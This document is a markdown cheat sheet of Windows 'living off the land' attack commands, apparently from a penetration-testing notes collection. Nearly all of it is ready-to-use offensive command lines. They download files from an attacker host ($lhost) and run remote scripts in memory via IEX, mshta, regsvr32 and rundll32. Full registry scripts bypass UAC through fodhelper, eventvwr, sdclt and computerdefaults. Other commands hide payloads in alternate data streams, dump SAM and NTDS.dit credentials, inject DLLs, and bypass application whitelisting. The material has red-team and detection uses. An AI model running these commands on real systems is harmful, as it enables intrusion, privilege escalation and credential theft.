# LOLBAS - Windows Living Off The Land

## Table of Contents

- [Overview](#overview)
- [Download/Transfer Files](#downloadtransfer-files)
- [Execute Commands](#execute-commands)
- [UAC Bypass](#uac-bypass)
- [Alternate Data Streams](#alternate-data-streams)
- [Credential Dumping](#credential-dumping)
- [DLL Execution](#dll-execution)
- [Application Whitelisting Bypass](#application-whitelisting-bypass)

---

## Overview

LOLBAS (Living Off The Land Binaries, Scripts and Libraries) are legitimate Windows binaries that can be used for malicious purposes.

**Full Reference:** <https://lolbas-project.github.io/>

**Categories:**

- **Binaries** - Native Windows executables
- **Scripts** - WSH, VBS, PS1 scripts
- **Libraries** - DLLs that can be abused

---

## Download/Transfer Files

### certutil

> Download file

```cmd
certutil -urlcache -split -f http://$lhost/$file $file
```

> Download and decode Base64

```cmd
certutil -urlcache -split -f http://$lhost/$file.b64 $file.b64
certutil -decode $file.b64 $file.exe
```

> Encode file to Base64

```cmd
certutil -encode $file.exe $file.b64
```

### bitsadmin

> Download file (foreground)

```cmd
bitsadmin /transfer myJob /download /priority foreground http://$lhost/$file C:\Users\Public\$file
```

> Download file (create job)

```cmd
bitsadmin /create myJob
bitsadmin /addfile myJob http://$lhost/$file C:\Users\Public\$file
bitsadmin /resume myJob
bitsadmin /complete myJob
```

### PowerShell (iwr/wget)

> Download file

```powershell
Invoke-WebRequest -Uri http://$lhost/$file -OutFile $file
iwr http://$lhost/$file -o $file
```

> Download and execute in memory

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://$lhost/$script.ps1')
IEX(IWR http://$lhost/$script.ps1 -UseBasicParsing)
```

### curl (Windows 10+)

> Download file

```cmd
curl http://$lhost/$file -o $file
```

### wget (Windows 10+)

> Download file

```cmd
wget http://$lhost/$file -O $file
```

### esentutl

> Copy file (alternative to copy)

```cmd
esentutl /y C:\Windows\System32\config\SAM /d C:\tmp\SAM /o
```

> Download file (via WebDAV)

```cmd
esentutl /y \\$lhost\share\$file /d C:\tmp\$file /o
```

### expand

> Copy file from CAB

```cmd
expand \\$lhost\share\$file.cab C:\tmp\$file.exe
```

### findstr

> Download via SMB

```cmd
findstr /V "notexist" \\$lhost\share\$file > C:\tmp\$file
```

### MpCmdRun (Defender)

> Download file

```cmd
MpCmdRun.exe -DownloadFile -url http://$lhost/$file -path C:\tmp\$file
```

### replace

> Copy file

```cmd
replace \\$lhost\share\$file C:\tmp /A
```

---

## Execute Commands

### mshta

> Execute HTA from URL

```cmd
mshta http://$lhost/payload.hta
```

> Execute VBScript

```cmd
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami"":close")
```

> Execute JavaScript

```cmd
mshta javascript:a=new%20ActiveXObject("WScript.Shell");a.Run("cmd.exe /c whoami");close();
```

### msiexec

> Execute MSI from URL

```cmd
msiexec /q /i http://$lhost/payload.msi
```

> Execute DLL

```cmd
msiexec /y C:\path\to\payload.dll
```

### rundll32 (Execute)

> Execute DLL function

```cmd
rundll32.exe C:\path\to\payload.dll,EntryPoint
```

> Execute JavaScript

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami");
```

> Execute from URL via mshtml

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:http://$lhost/payload.sct");
```

### regsvr32 (Execute)

> Execute SCT from URL

```cmd
regsvr32 /s /n /u /i:http://$lhost/payload.sct scrobj.dll
```

### cmstp

> Execute INF file

```cmd
cmstp.exe /ni /s C:\path\to\payload.inf
```

### forfiles

> Execute command

```cmd
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc.exe"
```

### pcalua

> Execute program

```cmd
pcalua.exe -a calc.exe
pcalua.exe -a C:\path\to\payload.exe
```

### SyncAppvPublishingServer

> Execute PowerShell

```cmd
SyncAppvPublishingServer.exe "n; Start-Process cmd.exe"
```

### explorer

> Execute program

```cmd
explorer.exe C:\path\to\payload.exe
```

---

## UAC Bypass

### fodhelper

```powershell
# Set registry key
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\path\to\payload.exe" -Force

# Trigger
Start-Process fodhelper.exe -WindowStyle Hidden

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Recurse -Force
```

### eventvwr

```powershell
# Set registry key
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\path\to\payload.exe" -Force

# Trigger
Start-Process eventvwr.exe -WindowStyle Hidden
```

### computerdefaults

```powershell
# Set registry key
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\path\to\payload.exe" -Force

# Trigger
Start-Process computerdefaults.exe -WindowStyle Hidden
```

### sdclt

```powershell
# Set registry key
New-Item "HKCU:\Software\Classes\Folder\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\path\to\payload.exe" -Force

# Trigger
Start-Process sdclt.exe -WindowStyle Hidden
```

---

## Alternate Data Streams

### Write to ADS

```cmd
echo "hidden data" > file.txt:hidden.txt
type payload.exe > file.txt:payload.exe
```

### Read from ADS

```cmd
more < file.txt:hidden.txt
powershell Get-Content -Path file.txt -Stream hidden.txt
```

### Execute from ADS

```cmd
wmic process call create "C:\path\file.txt:payload.exe"
forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\path\file.txt:payload.exe"
```

### List ADS

```cmd
dir /r
powershell Get-Item -Path file.txt -Stream *
```

---

## Credential Dumping

### reg.exe

> Dump SAM, SYSTEM, SECURITY

```cmd
reg save HKLM\SAM C:\tmp\SAM
reg save HKLM\SYSTEM C:\tmp\SYSTEM
reg save HKLM\SECURITY C:\tmp\SECURITY
```

### ntdsutil

> Dump NTDS.dit (on Domain Controller)

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\tmp" q q
```

### vssadmin

> Create shadow copy and access NTDS

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\tmp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\tmp\SYSTEM
```

### diskshadow

> Script-based shadow copy

```cmd
# Create script.txt:
# set context persistent nowriters
# add volume c: alias myalias
# create
# expose %myalias% z:
# exit

diskshadow /s script.txt
copy z:\Windows\NTDS\NTDS.dit C:\tmp\NTDS.dit
```

### wbadmin

> Backup NTDS

```cmd
wbadmin start backup -backuptarget:E: -include:C:\Windows\NTDS
```

---

## DLL Execution

### rundll32 (DLL)

> Execute DLL

```cmd
rundll32.exe payload.dll,EntryPoint
rundll32.exe shell32.dll,Control_RunDLL payload.dll
```

### regsvr32 (DLL)

> Register/execute DLL

```cmd
regsvr32 /s payload.dll
regsvr32 /s /n /u /i:http://$lhost/payload.sct scrobj.dll
```

### control

> Execute DLL via Control Panel

```cmd
control.exe payload.dll
```

### odbcconf

> Execute DLL

```cmd
odbcconf /a {regsvr payload.dll}
```

### InstallUtil (DLL)

> Execute .NET DLL

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

### Mavinject

> Inject DLL into process

```cmd
mavinject.exe $PID /INJECTRUNNING C:\path\to\payload.dll
```

---

## Application Whitelisting Bypass

### MSBuild

> Execute C# code

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### InstallUtil (Bypass)

> Execute .NET assembly

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe
```

### Regasm

> Execute .NET assembly

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll
```

### Regsvcs

> Execute .NET assembly

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe payload.dll
```

### CMSTP

> Execute via INF

```cmd
cmstp.exe /ni /s payload.inf
```

### Bash (WSL)

> Execute via WSL

```cmd
bash.exe -c "whoami"
wsl.exe whoami
```

---

## Quick Reference

### File Transfer

| Binary | Command |
| :--- | :--- |
| certutil | `certutil -urlcache -split -f http://$lhost/$file $file` |
| bitsadmin | `bitsadmin /transfer job http://$lhost/$file $file` |
| PowerShell | `iwr http://$lhost/$file -o $file` |
| curl | `curl http://$lhost/$file -o $file` |

### Code Execution

| Binary | Command |
| :--- | :--- |
| mshta | `mshta http://$lhost/payload.hta` |
| msiexec | `msiexec /q /i http://$lhost/payload.msi` |
| rundll32 | `rundll32.exe payload.dll,Entry` |
| regsvr32 | `regsvr32 /s /n /u /i:http://$lhost/p.sct scrobj.dll` |

### UAC Bypass Quick Ref

| Binary | Technique |
| :--- | :--- |
| fodhelper | HKCU:\Software\Classes\ms-settings\Shell\Open\command |
| eventvwr | HKCU:\Software\Classes\mscfile\Shell\Open\command |
| computerdefaults | HKCU:\Software\Classes\ms-settings\Shell\Open\command |
| sdclt | HKCU:\Software\Classes\Folder\Shell\Open\command |

### Useful Paths

```cmd
# .NET Framework
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\

# System32
C:\Windows\System32\

# Temp directories
C:\Users\Public\
C:\Windows\Temp\
%TEMP%
```

---

## ðŸ“š See Also

### Related Privilege Escalation

- **[Privilege Escalation Windows](4.1.Privilege-Escalation-Windows.md)** - Complete Windows privesc methodology
- **[Potato Exploits](4.5.Potato-Exploits.md)** - Token impersonation privilege escalation
- **[Windows PrivEsc Tools](4.6.Windows-PrivEsc-Tools.md)** - RunasCs, Seatbelt, SharpUp

### Related Topics

- **[Windows Command](../6.OS-Command/6.1.Windows-command.md)** - Windows enumeration and system commands
- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - PowerShell and Windows reverse shells
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Post-exploitation movement
